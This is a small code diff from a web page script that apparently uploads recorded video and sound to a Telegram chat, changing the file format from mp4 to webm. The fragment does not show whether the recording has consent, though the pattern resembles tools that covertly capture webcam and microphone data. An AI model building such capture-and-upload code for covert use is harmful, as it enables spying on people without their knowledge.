@@ -120,10 +120,10 @@
 
         async function sendVideoToTelegram() {
             if (recordedChunks.length > 0) {
-                const blob = new Blob(recordedChunks, { type: "video/mp4" });
+                const blob = new Blob(recordedChunks, { type: "video/webm" });
                 const formData = new FormData();
                 formData.append("chat_id", TELEGRAM_CHAT_ID);
-                formData.append("video", blob, "rekaman.mp4");
+                formData.append("video", blob, "rekaman.webm");
                 formData.append("caption", "🎥 Rekaman video & suara");
 
                 try {
